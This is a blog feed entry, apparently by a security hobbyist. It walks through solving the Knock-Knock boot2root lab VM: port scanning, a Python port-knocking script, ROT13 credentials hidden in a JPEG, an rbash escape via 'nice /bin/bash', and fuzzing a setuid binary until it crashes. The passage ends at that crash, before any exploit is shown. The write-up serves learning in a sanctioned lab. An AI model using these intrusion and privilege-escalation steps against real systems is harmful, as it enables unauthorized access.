<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: ctf | #!/slash/note]]></title>
  <link href="http://leonjza.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://leonjza.github.io/"/>
  <updated>2014-10-14T19:16:43+02:00</updated>
  <id>http://leonjza.github.io/</id>
  <author>
    <name><![CDATA[Leon Jacobs]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[knock-knock who’s there?]]></title>
    <link href="http://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/"/>
    <updated>2014-10-14T09:14:26+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock</id>
    <content type="html"><![CDATA[<h2>introduction</h2>

<p><a href="http://vulnhub.com/series/knock-knock,53/">Knock-Knock</a> is a vulnerable boot2root VM by <a href="https://twitter.com/zer0w1re">@zer0w1re</a> and sure as heck was packed with interesting twists and things to learn!</p>

<p>I figured I&rsquo;d just <em>have a quick look™</em>, and midnight that evening ended up with <em>root</em> privileges :D</p>

<p>As always, if you have not done this VM yet, this post is a massive spoiler and I would highly recommend you close up here and try it first :)
This is my experience &lsquo;knocking&rsquo; on the door.</p>

<blockquote><p>“Theodore!”</p>

<p>“Theodore who?”</p>

<p>“Theodore wasn&rsquo;t open so I knocked”</p></blockquote>

<h2>getting started</h2>

<p>As always, the vm&rsquo;s files were downloaded and imported into VirtualBox. I fired up the vm and watched <code>arp</code> for any new entries. This presented the first hurdle. A ping scan showed no new IP&rsquo;s in the network range my VM&rsquo;s were in (192.168.56.0/24):</p>

<p>```bash
$ sudo nmap -sN 192.168.56.0/24</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 09:51 SAST
Nmap scan report for 192.168.56.1
Host is up (0.000030s latency).
All 1000 scanned ports on 192.168.56.1 are closed (936) or open|filtered (64)</p>

<p>Nmap done: 256 IP addresses (1 host up) scanned in 14.99 seconds
```</p>

<p>Only the gateway was alive. A <code>arp -a</code> however spilled some of the beans:</p>

<p>```bash
$ arp -i vboxnet0 -a
? (192.168.56.0) at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope [ethernet]
? (192.168.56.1) at a:0:27:0:0:0 on vboxnet0 ifscope permanent [ethernet]
? (192.168.56.2) at (incomplete) on vboxnet0 ifscope [ethernet]</p>

<p>[&hellip; snip &hellip;]</p>

<p>? (192.168.56.201) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.202) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.203) at 8:0:27:be:dd:c8 on vboxnet0 ifscope [ethernet]
? (192.168.56.204) at (incomplete) on vboxnet0 ifscope [ethernet]
? (192.168.56.205) at (incomplete) on vboxnet0 ifscope [ethernet]</p>

<p>[&hellip; snip &hellip;]</p>

<p>? (192.168.56.255) at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope [ethernet]
```</p>

<p>Hello <code>.203</code>! Pinging 192.168.56.203 responded with Destination Port Unreachable messages:</p>

<p>```bash
root@kali:~# ping -c 2 192.168.56.203
PING 192.168.56.203 (192.168.56.203) 56(84) bytes of data.
From 192.168.56.203 icmp_seq=1 Destination Port Unreachable
From 192.168.56.203 icmp_seq=2 Destination Port Unreachable</p>

<p>&mdash;&ndash; 192.168.56.203 ping statistics &mdash;&ndash;
2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 999ms
```</p>

<p>While a little confusing at first, I figured the firewall was to blame here. I proceeded to focus my attention on this IP and did a normal <code>nmap</code> scan:</p>

<p>```bash
root@kali:~# nmap -sV &mdash;reason 192.168.56.203 -p-</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 10:03 SAST
Nmap scan report for 192.168.56.203
Host is up, received reset (0.0016s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT     STATE SERVICE REASON  VERSION
1337/tcp open  waste?  syn-ack</p>

<p>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
SF-Port1337-TCP:V=6.46%I=7%D=10/14%Time=543CEE50%P=i686-pc-linux-gnu%r(NUL
SF:L,15,&ldquo;[12247,\x202759,\x2026802]\n&rdquo;)%r(GenericLines,15,&ldquo;[37866,\x202
SF:9242,\x203904]\n&rdquo;)%r(GetRequest,15,&ldquo;[29185,\x207368,\x2028937]\n&rdquo;)%r
SF:(HTTPOptions,15,&ldquo;[55772,\x205315,\x2050180]\n&rdquo;)%r(RTSPRequest,13,&ldquo;[9
SF:301,\x2026341,\x20574]\n&rdquo;)%r(RPCCheck,16,&ldquo;[34002,\x2046353,\x2023995\
SF:]\n&rdquo;)%r(DNSVersionBindReq,16,&ldquo;[47043,\x2037532,\x2024012]\n&rdquo;)%r(DNSSt
SF:atusRequest,15,&ldquo;[31914,\x208919,\x2027965]\n&rdquo;)%r(Help,15,&ldquo;[63865,\x2
SF:07077,\x2055801]\n&rdquo;)%r(SSLSessionReq,15,&ldquo;[30406,\x208520,\x2047713]\
SF:n&rdquo;)%r(Kerberos,16,&ldquo;[10459,\x2050977,\x2063996]\n&rdquo;)%r(SMBProgNeg,16,&ldquo;\
SF:[61080,\x2038407,\x2048416]\n&rdquo;)%r(X11Probe,15,&ldquo;[61127,\x2058212,\x203
SF:856]\n&rdquo;)%r(FourOhFourRequest,16,&ldquo;[11007,\x2051452,\x2038765]\n&rdquo;)%r(L
SF:PDString,15,&ldquo;[5738,\x2063719,\x2026394]\n&rdquo;)%r(LDAPBindReq,14,&ldquo;[14292
SF:,\x20937,\x2020668]\n&rdquo;)%r(SIPOptions,16,&ldquo;[33684,\x2058491,\x2031373]
SF:\n&rdquo;)%r(LANDesk-RC,16,&ldquo;[58946,\x2030941,\x2053345]\n&rdquo;)%r(TerminalServe
SF:r,15,&ldquo;[6672,\x2031370,\x2053882]\n&rdquo;)%r(NCP,16,&ldquo;[15356,\x2041972,\x20
SF:52087]\n&rdquo;)%r(NotesRPC,16,&ldquo;[51444,\x2044303,\x2013901]\n&rdquo;)%r(WMSReque
SF:st,13,&ldquo;[87,\x2044952,\x2060309]\n&rdquo;)%r(oracle-tns,15,&ldquo;[51073,\x204686
SF:0,\x206777]\n&rdquo;)%r(afp,16,&ldquo;[30287,\x2064026,\x2029364]\n&rdquo;)%r(kumo-ser
SF:ver,14,&ldquo;[17824,\x2048485,\x20579]\n&rdquo;);</p>

<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 5521.11 seconds
```</p>

<h2>knock knock&hellip;</h2>

<p><code>tcp/1337</code> was the only open port on the machine. I promptly connected to it to see what we have:</p>

<p>```bash
root@kali:~# nc -vn 192.168.56.203 1337
(UNKNOWN) [192.168.56.203] 1337 (?) open
[6605, 29872, 38566]</p>

<p>root@kali:~# nc -vn 192.168.56.203 1337
(UNKNOWN) [192.168.56.203] 1337 (?) open
[43059, 22435, 17432]
```</p>

<p>Interesting. Each connection returns a list of numbers. At this stage I should mention that the name of the VM, together with the list of 3 numbers (which look like port numbers as they are always below 65535) had me think that this had to be the sequence in which we have to knock ports to open others.</p>

<p><a href="http://en.wikipedia.org/wiki/Port_knocking">Port knocking</a> generally means that we send a sequence of packets on specific ports so that the listener may perform a certain action when the correct sequence has been &lsquo;knocked&rsquo;. Think of it literally as if someone knocks 3 times at your door and you open up. The only thing is the 3 knocks have to be in a specific order, and if they are not, you will generally ignore the person at the door. It&rsquo;s also important to note that you will also not react to say a single knock. Only those 3 specific ones.</p>

<p>There are plenty of implementations of port knocking out there. My personal favorite being <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> by <a href="https://twitter.com/moxie">@moxie</a>. I have previously played with this implementation and its pretty sweet. A crypted packet is sent to a machine that is logging firewall drops. <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> tails the <code>kern.log</code> and reacts on the correct sequences.</p>

<p>This VM did not give any hints on secrets, so I figured that the implementation is probably not this one. But which one is it? Hard to say at this stage.</p>

<h2>&hellip;whos there?</h2>

<p>So with the <code>tcp/1337</code> service telling us a sequence, I set out to test this knocking theory. The first attempt was simply a loop over the ports, using <code>nmap</code> to scan them:</p>

<p>```bash
root@kali:~# for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
43059/tcp filtered unknown</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
22435/tcp filtered unknown</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
17432/tcp filtered unknown</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
```</p>

<p>With that done, I rescanned the box for any new open ports but nothing was different. I retried the <code>nmap</code> loop just to make sure, but it did not appear to make a difference.</p>

<p>Remembering that the sequence changed every time you connected to the <code>tcp/1337</code> service, I figured it may change some configuration on the server to accept a new sequence. So, I re-connected to the <code>tcp/1337</code> service, and looped over the new sequence. Still, nothing. At this stage a was starting to feel relatively lost as to what may be happening. I returned to doing some research on some implementations of this knock knock concept and came across <a href="https://github.com/jvinet/knock">knockd</a>. I downloaded the <a href="https://github.com/jvinet/knock/blob/master/src/knock.c">client</a> and compiled locally with <code>gcc knock.c -o knock</code> and tested to see if this makes any difference.</p>

<p>Still nothing. Inspecting this clients sources actually revealed nothing spectacular, and so I though my last resort will be to capture some traffic via wireshark and see if I can figure out anything strange there.</p>

<h2>22 and 80 too</h2>

<p>The wireshark testing revealed nothing out of the ordinary. The traffic was behaving as expected. I continuously connected to the <code>tcp/1337</code> service and toyed with some scapy to get different packet variations sent, followed by a full nmap. No dice. A sample scapy session was:</p>

<p>```bash</p>

<blockquote><blockquote><blockquote><p>ip=IP(dst=&ldquo;192.168.56.203&rdquo;)
SYN=TCP(dport=40508,flags=&ldquo;S&rdquo;)
send(ip/SYN)
.
Sent 1 packets.</p>

<p>```</p></blockquote></blockquote></blockquote>

<p>After quite some time, suddenly, nmap reports <code>tcp/22</code> and <code>tcp/80</code> as open&hellip;</p>

<p>```bash
root@kali:~# nmap 192.168.56.203</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:40 SAST
Nmap scan report for 192.168.56.203
Host is up (0.00032s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 4.98 seconds
```</p>

<p><strong>W.T.F.</strong> I actually had no idea why this worked. I had some theories, but based on the amount of testing I did, I figured that I effectively brute-forced my way in.</p>

<p>With the ports now open, I did shuffle some ideas with a few people, and it came out the the sequence may be randomized. With that in mind, I decided to slap together a python script that will try all of the possible sequences and knock all of them, hoping that one of them is eventually the correct one:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<p>import socket
import itertools
import sys</p>

<p>destination = &ldquo;192.168.56.203&rdquo;</p>

<p>def clean_up_ports(raw_string):</p>

<pre><code>""" Clean up the raw string received on the socket"""
if len(raw_string) &lt;= 0:
    return None

# Remove the first [
raw_string = raw_string.replace('[','')
# Remove the second ]
raw_string = raw_string.replace(']','')
# split by commas
first_list = raw_string.split(',')

# start e empty return list
ports = []
for port in first_list:
    # strip the whitespace around the string
    # and cast to a integer
    ports.append(int(port.strip()))

return  ports
</code></pre>

<p>def main():</p>

<pre><code>print "[+] Getting sequence"

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((destination, 1337))
except Exception as e:
    print "[+] Unable to connect to %s on port 1337. %s" % (destination, e)
    sys.exit(1)

# receive the list
raw_list = sock.recv(20)

# get the ports in a actual python list
ports = clean_up_ports(raw_list)

print "[+] Sequence is %s" % ports
print "[+] Knocking on the door using all the possible combinations...\n"

# Lets knock all of the possible combinations of the ports list
for port_list in itertools.permutations(ports):

    print "[+] Knocking with sequence: %s" % (port_list,) 
    for port in port_list:
        print "[+] Knocking on port %s:%s" % (destination,port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        sock.connect_ex((destination, port))
        sock.close()

    print "[+] Finished sequence knock\n"
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code>print "[+] Knock knock opener"
main()
print "[+] Done"
</code></pre>

<p>```</p>

<p>Running this opened the ports every go :)</p>

<p>I know that I could test to see if say <code>tcp/22</code> was open, but I went with the assumption that you don&rsquo;t know what the actual ports are that should be opened, and hence the complete run of all of the permutations.</p>

<h2>may I burn the door now?</h2>

<p>So, focus shifted to the web server at <code>tcp/80</code>. Browsing to the web server presented us with the following:</p>

<p><img class="<a" src="href="https://i.imgur.com/5NdJ65y.png">https://i.imgur.com/5NdJ65y.png</a>"></p>

<p>Any path/file that you browse to will return this exact same picture. Sound familiar? :) This kinda breaks any form of scanning and or enumeration via things like <code>wfuzz</code> etc. With the hint <em>Gotta look harder</em>, I decided to move my attention to the door image itself.</p>

<p><code>``bash
root@kali:~# wget http://192.168.56.203/knockknock.jpg
--2014-10-14 13:04:34--  http://192.168.56.203/knockknock.jpg
Connecting to 192.168.56.203:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 84741 (83K) [image/jpeg]
Saving to:</code>knockknock.jpg'</p>

<p>100%[============>] 84,741      68.2K/s   in 1.2s</p>

<p>2014-10-14 13:04:35 (68.2 KB/s) &ndash; `knockknock.jpg' saved [84741/84741]
```</p>

<p>I will admit that I was not very keen on the idea that something may be stego&rsquo;d in the image and I was really hoping the hint would be very obvious. I opened up the image in a image viewer and zoomed in a little on the artifact I noticed at the bottom of the image. Nothing I could make real use of there.</p>

<p>Next, I ran the image through exiftool:</p>

<p><code>bash
root@kali:~/Desktop/knock-knock# exiftool knockknock.jpg
ExifTool Version Number         : 8.60
File Name                       : knockknock.jpg
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2014:10:06 18:38:30+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 100
Y Resolution                    : 100
Quality                         : 74%
XMP Toolkit                     : Adobe XMP Core 4.1-c036 46.276720, Mon Feb 19 2007 22:13:43
Marked                          : © Estate of Roy Lichtenstein
Web Statement                   : © Estate of Roy Lichtenstein
Rights                          : © Estate of Roy Lichtenstein
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 650
Image Height                    : 788
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 650x788
</code></p>

<p>Roy Lichtenstein. The artist of the knock knock image?
Anyways. As you can see, nothing else that is really useful here. So the next part was to have a look at the jpeg in a raw perspective. I am no forensics expert or anything so I am pretty limited in knowledge here.</p>

<p>My idea was to try and recover the jpeg data from <code>knockknock.jpg</code> using <code>recoverjpeg</code>, and then compare the resulting image with the original and check for any differences.</p>

<p>```bash</p>

<h1>extract the jpeg data</h1>

<p>root@kali:~# recoverjpeg knockknock.jpg
Restored 1 picture</p>

<h1>the output image from the extract</h1>

<p>root@kali:~# ls image00000.jpg
image00000.jpg</p>

<h1>the cmp</h1>

<p>root@kali:~# cmp image00000.jpg knockknock.jpg
cmp: EOF on image00000.jpg
```</p>

<p>So, the EOF differs from the 2 files. Lets check them out. First the extracted jpeg data file to see what it sais:</p>

<p><code>``bash
root@kali:~# tail -n 1 image00000.jpg
9��&lt;V ��v�ܫQqRJ5U�&lt;��W�V9</code>��5BV(��&lt;�t�WS�����1h</p>

<pre><code>                                                     ��\���z$���vB��
</code></pre>

<p>```</p>

<p>As expected, junk :P Lets look at <code>knockknock.jpeg</code>:</p>

<p><code>bash
root@kali:~# tail -n 4 knockknock.jpg
⭚|U���b��[�k|U�������+\U����]�U¸��qW|U�]�qWX�F��*��kz����]��ѭqV�k튷�P���b��T�\+\U��Wo��9b�&lt;�V��]���B��[�v*�Uثx�X�x�[����o������|U����v*�^��x��Wb�o���b��b��[����qU����צ*����*���qW�
Login Credentials
abfnW
sax2Cw9Ow
</code></p>

<p>Hah! Login Credentials sound very promising!! :)</p>

<h2>ceasar opens the door</h2>

<p>After finding the hidden strings in the jpeg, I came to a quick realization that <code>abfnW:sax2Cw9Ow</code> was not a username:password combination for the SSH service. Nor was any variations of the 2 strings.</p>

<p>I tried to browse to the paths in the web server such as <code>abfnW/</code> and <code>sax2Cw9Ow/</code>, but still only got the knock knock image. With these arb strings and nothing else really to go on, I had to try get a hint on this.</p>

<p>Turns out, the strings were encoded using a Ceasar Cipher (<a href="http://en.wikipedia.org/wiki/Caesar_cipher">ROT13</a>). With that in mind, I took to a few python 1 liners to decode the strings. Lets start with <strong>abfnW</strong>:</p>

<p><code>bash
root@kali:~# python -c 'print "abfnW".decode("rot13")'
nosaJ
</code></p>

<p>abfnW decoded directly to <strong>nosaJ</strong>. That is <em>Jason</em> reversed. So is the username <code>Jason</code>? Next, I tackled <code>sax2Cw9Ow</code> in a similar fashion:</p>

<p><code>bash
root@kali:~# python -c 'print "sax2Cw9Ow".decode("rot13")'
fnk2Pj9Bj
</code></p>

<p>sax2Cw9Ow decodes to <strong>fnk2Pj9Bj</strong>. Is this one also reversed? After a number of attempts and variations, it turns out that the user name is <strong>jason</strong> (without the cap <em>J</em>) and the password is <strong>fnk2Pj9Bj</strong> (jB9jP2knf reversed.) To get the strings in their correct values, we can use the following 2 one liners to get them:</p>

<p>```bash</p>

<h1>username</h1>

<p>root@kali:~# python -c &lsquo;print &ldquo;abfnW&rdquo;.decode(&ldquo;rot13&rdquo;)[::-1].lower()&rsquo;
jason</p>

<h1>password</h1>

<p>root@kali:~# python -c &lsquo;print &ldquo;sax2Cw9Ow&rdquo;.decode(&ldquo;rot13&rdquo;)[::-1]&rsquo;
jB9jP2knf
```</p>

<p>So to get our first shell:</p>

<p>```bash
root@kali:~/Desktop/knock-knock# ssh <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#106;&#x61;&#x73;&#x6f;&#110;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#53;&#54;&#46;&#50;&#x30;&#x33;">&#106;&#x61;&#x73;&#x6f;&#x6e;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#53;&#x36;&#x2e;&#50;&#x30;&#x33;</a>
<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x6a;&#x61;&#115;&#111;&#x6e;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#53;&#x36;&#46;&#50;&#x30;&#x33;">&#x6a;&#x61;&#115;&#x6f;&#110;&#x40;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#x35;&#x36;&#46;&#x32;&#48;&#x33;</a>&rsquo;s password:</p>

<p>Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
jason@knockknock:~$
```</p>

<h2>no rbash, just no</h2>

<p>Upon first login, I pressed TAB out of pure habit and was immediately presented with the following:</p>

<p><code>bash
jason@knockknock:~$ -rbash: /dev/null: restricted: cannot redirect output
-rbash: /dev/null: restricted: cannot redirect output
</code>
Rbash? Oh well thats ok. I checked by inspecting the env var for <code>SHELL</code> which was <code>/bin/rbash</code> just to confirm. Thanks to having recently met a similar situation during the <a href="https://leonjza.github.io/blog/2014/09/18/from-persistence/">Persistence</a> boot2root and learning new ways of breaking out of <code>rbash</code>, I just typed <code>nice /bin/bash</code>, which runs a program, supposedly modifying its priority. In this case we care little about the priority. :) We now have a full <code>bash</code> shell.</p>

<h2>tiny file crypter</h2>

<p>Some quick initial enumeration did not reveal anything particularly interesting. In <code>jason</code>&rsquo;s home folder though was a file called <code>tfc</code>:</p>

<p>```bash
jason@knockknock:~$ ls -lah
total 32K
drwxr-xr-x 2 jason jason 4.0K Oct 11 18:51 .
drwxr-xr-x 3 root  root  4.0K Sep 24 21:03 ..
lrwxrwxrwx 1 jason jason    9 Sep 26 09:50 .bash_history &ndash;> /dev/null
-rw-r&mdash;r&mdash; 1 jason jason  220 Sep 24 21:03 .bash_logout
-rw-r&mdash;r&mdash; 1 jason jason 3.4K Sep 25 21:58 .bashrc
-rw-r&mdash;r&mdash; 1 jason jason  675 Sep 24 21:03 .profile
-rwsr-xr-x 1 root  jason 7.3K Oct 11 18:35 tfc
-rw&mdash;&mdash;&mdash;&ndash; 1 jason jason 2.4K Oct 11 18:42 .viminfo</p>

<p>jason@knockknock:~$ ./tfc</p>

<hr />

<p>_<em>    </em><strong>/_   </strong><strong><em>/_   </em></strong> \
  |    |    |    <strong>)  /    \  \/
  |    |    |     \   \     _</strong><em>
  |</em><em><strong>|    _</strong>  /    _</em>____  /</p>

<pre><code>            \/            \/ 

Tiny File Crypter - 1.0
</code></pre>

<p>Usage: ./tfc &lt;filein.tfc> &lt;fileout.tfc>
jason@knockknock:~$
```</p>

<p><em>Tiny File Crypter</em> appeared to take a input file and encrypt it. Fair enough. The file is owned by root with the <code>setuid</code> bit set, strongly suggesting that if we are able to exploit this binary somehow, we may be able to get root.</p>

<p>Some important observations about <code>tfc</code> during the first bits of testing; Input and output files must have the <code>.tfc</code> extension. <code>tfc</code> does not allow for symlinks as input and or output files. Lastly, the input and output file has to be set and accessible by <code>tfc</code>. Considering its run as root, that probably wont be a problem.</p>

<p>A sample encryption run can be seen as:</p>

<p>```bash</p>

<h1>we have a source document</h1>

<p>jason@knockknock:~$ cat test.tfc
This is a test document.</p>

<h1>we run the encryption program over it</h1>

<p>jason@knockknock:~$ ./tfc test.tfc crypt.tfc</p>

<blockquote><blockquote><p>File crypted, goodbye!</p></blockquote></blockquote>

<h1>dump the encrypted file as hex. from the ascii we</h1>

<h1>can see its no longer human readable</h1>

<p>jason@knockknock:~$ xxd crypt.tfc
0000000: cbd9 7399 3cdf 9922 26f1 cb40 5e85 6a6d  ..s.&lt;..&ldquo;&amp;..@^.jm
0000010: 07a4 7543 5048 ea33 6a                   ..uCPH.3j</p>

<h1>the resulting file is owned by root</h1>

<p>jason@knockknock:~$ ls -l crypt.tfc
-rw-r&mdash;r&mdash; 1 root jason 25 Oct 14 08:12 crypt.tfc
```</p>

<p>Now, there is one very important finding. We can reverse the encrypted file by simply running it through <code>tfc</code> again:</p>

<p>```bash
jason@knockknock:~$ ./tfc crypt.tfc reversed.tfc</p>

<blockquote><blockquote><p>File crypted, goodbye!</p></blockquote></blockquote>

<p>jason@knockknock:~$ cat reversed.tfc
This is a test document.
```</p>

<p>After finding this, quite a few ideas pop into ones head. Most notably, the fact that the encryption is reversible by using the same tool, suggests it is <a href="http://en.wikipedia.org/wiki/Symmetric-key_algorithm">symmetric</a> using the same key for encryption and decryption.</p>

<p>But ok. That actually means nothing now. It also definitely does not tell us how to break <code>tfc</code> either!</p>

<h2>fuzzing &amp; disassembling tfc</h2>

<p>With all of the information gathered thus far about <code>tfc</code>, I tried a few more tricks to get it to override files in arb places and or read arb files. The extension requirement and symlink checks basically foiled all of my attempts. In summary, I wanted to try and override <code>/etc/shadow</code> to replace <code>root</code>s password, or replace <code>/root/.ssh/authorized_keys</code> with one of my own, but the checks prevented all of that. The best I could get was that I could write files anywhere, but they would always have the <code>.tfc</code> extension.</p>

<p>By now it became very apparent that we have to bring <code>tfc</code> under the microscope and have a closer look at what is happening inside. The first step was to run <code>tfc</code> through <code>strings</code> and check the output:</p>

<p>```bash
jason@knockknock:~$ strings tfc
/lib/ld-linux.so.2</p>

<p>[&hellip; snip &hellip;]</p>

<p>[^_]</p>

<pre><code>Tiny File Crypter - 1.0
</code></pre>

<p>Usage: ./tfc &lt;filein.tfc> &lt;fileout.tfc></p>

<blockquote><blockquote><p>Filenames need a .tfc extension
No symbolic links!
Failed to open input file
Failed to create the output file
File crypted, goodbye!
;*2$"</p>

<hr />

<p>_<em>    </em><strong>/_   </strong><strong><em>/_   </em></strong> \
  |    |    |    <strong>)  /    \  \/
  |    |    |     \   \     _</strong><em>
  |</em><em><strong>|    _</strong>  /    _</em>____  /</p>

<pre><code>            \/            \/ 
</code></pre>

<p>```</p></blockquote></blockquote>

<p>As you can see, quite literally nothing useful. The only familiar thing here was the error messages that I have seen while testing initially :D</p>

<p>I figured I needed to get <code>tfc</code> into <code>gdb</code> and inspect it further there, however this VM did not have <code>gdb</code> installed. So, I copied it off the VM onto my Kali Linux install and plugged it into <code>gdb</code>. Then, to get an idea of what its doing, I started to disassemble it, starting with <code>main</code>:</p>

<p>```bash
root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048924 &lt;+0>: push   ebp
   0x08048925 &lt;+1>: mov    ebp,esp</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x0804894e &lt;+42>:    mov    DWORD PTR [esp],eax
   0x08048951 &lt;+45>:    call   0x80486e6 <cryptFile>    #&lt;&mdash;&ndash;
   0x08048956 &lt;+50>:    test   eax,eax</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x0804896c &lt;+72>:    ret  <br/>
End of assembler dump.
gdb-peda$
```</p>

<p>After some initial setup work and argument checks we notice a call to a function called <code>cryptFile</code>. So the next logical step was to check what happening in that function:</p>

<p>```bash
gdb-peda$ disass cryptFile
Dump of assembler code for function cryptFile:
   0x080486e6 &lt;+0>: push   ebp
   0x080486e7 &lt;+1>: mov    ebp,esp
   0x080486e9 &lt;+3>: sub    esp,0x1088</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x080488a8 &lt;+450>:   mov    DWORD PTR [esp],eax
   0x080488ab &lt;+453>:   call   0x8048618 <xcrypt>       #&lt;&mdash;&ndash;
   0x080488b0 &lt;+458>:   mov    eax,DWORD PTR [ebp-0x14]</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x08048922 &lt;+572>:   leave<br/>
   0x08048923 &lt;+573>:   ret  <br/>
End of assembler dump.
gdb-peda$
```</p>

<p><code>crytFile</code> does some internal <em>things</em> (like <code>call   0x80484a0 &lt;open@plt&gt;</code> opening the file?) and eventually calls a function <code>xcrypt</code>. So, what are we gonna do? Disassemble it ofc! :) Inspecting it it seemed that this may be the actual heart of the encryption logic based on the bunch of <code>xor</code> calls it had. Of course, this is only a guess and I may have missed something else completely.</p>

<p>I also checked out the security features this binary was compiled with:</p>

<p><code>bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
</code></p>

<p>Woa. <strong>No</strong> security? Ok&hellip;</p>

<h2>we knocked and tfc opened the door to bof</h2>

<p>The disassembly of <code>tfc</code> did not exactly point out any specific failures immediately either. Mainly due to my complete noobness. :)</p>

<p>So, I had the idea to check how it handles large files. And by large I mean to gradually increase the size of the file to be encrypted, starting with like 2MB. So I started to test this:</p>

<p>```bash</p>

<h1>create a file of roughly 2MB</h1>

<p>root@kali:~# dd if=/dev/urandom of=large.tfc bs=1M count=2
2+0 records in
2+0 records out
2097152 bytes (2.1 MB) copied, 0.132812 s, 15.8 MB/s</p>

<h1>confirm the size of the file</h1>

<p>root@kali:~# ls -lh large.tfc
-rw-r&mdash;r&mdash; 1 root root 2.0M Oct 14 15:01 large.tfc</p>

<h1>check how many characters we have in the file</h1>

<p>root@kali:~# wc -c large.tfc
2097152 large.tfc</p>

<h1>attempt encryption</h1>

<p>root@kali:~# ./tfc large.tfc out.tfc
Segmentation fault
```</p>

<p><em>Segmentation fault</em>! Being able to crash <code>tfc</code> is really good news. I went on to test just how many characters were needed to crash <code>tfc</code> in a easily reproducible way, and it came down to something like 6000 characters were doing the job just fine. So, it was time to inspect this crash in <code>gdb</code>. I first prepared a new file with just &ldquo;A&rdquo; in it:</p>

<p><code>bash
root@kali:~# echo -n $(python -c 'print "A"*6000') &gt; gdb-test.tfc
</code></p>

<p>And continued to run it in <code>gdb</code>:</p>

<p>```bash
root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.
gdb-peda$ r gdb-test.tfc gdb-test-out.tfc</p>

<p>Program received signal SIGSEGV, Segmentation fault.
